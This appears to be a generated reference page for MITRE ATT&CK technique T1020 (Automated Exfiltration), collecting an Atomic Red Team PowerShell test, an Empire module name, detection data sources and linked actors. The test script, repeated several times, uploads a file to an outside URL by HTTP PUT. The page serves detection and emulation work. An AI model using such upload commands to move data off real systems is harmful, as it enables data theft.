
# Automated Exfiltration

## Description

### MITRE Description

> Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. 

When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: True
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1020

## Potential Commands

```
$fileName = "C:\temp\T1020_exfilFile.txt"
$url = "#{domain}"
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
$fileName = "#{file}"
$url = "https://google.com"
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
powershell/exfiltration/egresscheck
```

## Commands Dataset

```
[{'command': '$fileName = "C:\\temp\\T1020_exfilFile.txt"\n'
             '$url = "#{domain}"\n'
             '$file = New-Item -Force $fileName -Value "This is ART IcedID '
             'Botnet Exfil Test"\n'
             '$contentType = "application/octet-stream"\n'
             'try {Invoke-WebRequest -Uri $url -Method Put -ContentType '
             '$contentType -InFile $fileName} catch{}',
  'name': None,
  'source': 'atomics/T1020/T1020.yaml'},
 {'command': '$fileName = "#{file}"\n'
             '$url = "https://google.com"\n'
             '$file = New-Item -Force $fileName -Value "This is ART IcedID '
             'Botnet Exfil Test"\n'
             '$contentType = "application/octet-stream"\n'
             'try {Invoke-WebRequest -Uri $url -Method Put -ContentType '
             '$contentType -InFile $fileName} catch{}',
  'name': None,
  'source': 'atomics/T1020/T1020.yaml'},
 {'command': 'powershell/exfiltration/egresscheck',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/exfiltration/egresscheck',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4663', 'File monitoring']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Automated Exfiltration': {'atomic_tests': [{'auto_generated_guid': '9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0',
                                                                      'description': 'Creates '
                                                                                     'a '
                                                                                     'text '
                                                                                     'file\n'
                                                                                     'Tries '
                                                                                     'to '
                                                                                     'upload '
                                                                                     'to '
                                                                                     'a '
                                                                                     'server '
                                                                                     'via '
                                                                                     'HTTP '
                                                                                     'PUT '
                                                                                     'method '
                                                                                     'with '
                                                                                     'ContentType '
                                                                                     'Header\n'
                                                                                     'Deletes '
                                                                                     'a '
                                                                                     'created '
                                                                                     'file',
                                                                      'executor': {'cleanup_command': '$fileName '
                                                                                                      '= '
                                                                                                      '"#{file}"\n'
                                                                                                      'Remove-Item '
                                                                                                      '-Path '
                                                                                                      '$fileName '
                                                                                                      '-ErrorAction '
                                                                                                      'Ignore',
                                                                                   'command': '$fileName '
                                                                                              '= '
                                                                                              '"#{file}"\n'
                                                                                              '$url '
                                                                                              '= '
                                                                                              '"#{domain}"\n'
                                                                                              '$file '
                                                                                              '= '
                                                                                              'New-Item '
                                                                                              '-Force '
                                                                                              '$fileName '
                                                                                              '-Value '
                                                                                              '"This '
                                                                                              'is '
                                                                                              'ART '
                                                                                              'IcedID '
                                                                                              'Botnet '
                                                                                              'Exfil '
                                                                                              'Test"\n'
                                                                                              '$contentType '
                                                                                              '= '
                                                                                              '"application/octet-stream"\n'
                                                                                              'try '
                                                                                              '{Invoke-WebRequest '
                                                                                              '-Uri '
                                                                                              '$url '
                                                                                              '-Method '
                                                                                              'Put '
                                                                                              '-ContentType '
                                                                                              '$contentType '
                                                                                              '-InFile '
                                                                                              '$fileName} '
                                                                                              'catch{}',
                                                                                   'name': 'powershell'},
                                                                      'input_arguments': {'domain': {'default': 'https://google.com',
                                                                                                     'description': 'Destination '
                                                                                                                    'Domain',
                                                                                                     'type': 'url'},
                                                                                          'file': {'default': 'C:\\temp\\T1020_exfilFile.txt',
                                                                                                   'description': 'Exfiltration '
                                                                                                                  'File',
                                                                                                   'type': 'String'}},
                                                                      'name': 'IcedID '
                                                                              'Botnet '
                                                                              'HTTP '
                                                                              'PUT',
                                                                      'supported_platforms': ['windows']}],
                                                    'attack_technique': 'T1020',
                                                    'display_name': 'Automated '
                                                                    'Exfiltration'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1020',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/exfiltration/egresscheck":  '
                                                                                 '["T1020"],',
                                            'Empire Module': 'powershell/exfiltration/egresscheck',
                                            'Technique': 'Automated '
                                                         'Exfiltration'}}]
```

# Tactics


* [Exfiltration](../tactics/Exfiltration.md)


# Mitigations


* [Automated Exfiltration Mitigation](../mitigations/Automated-Exfiltration-Mitigation.md)


# Actors


* [Honeybee](../actors/Honeybee.md)

* [Frankenstein](../actors/Frankenstein.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
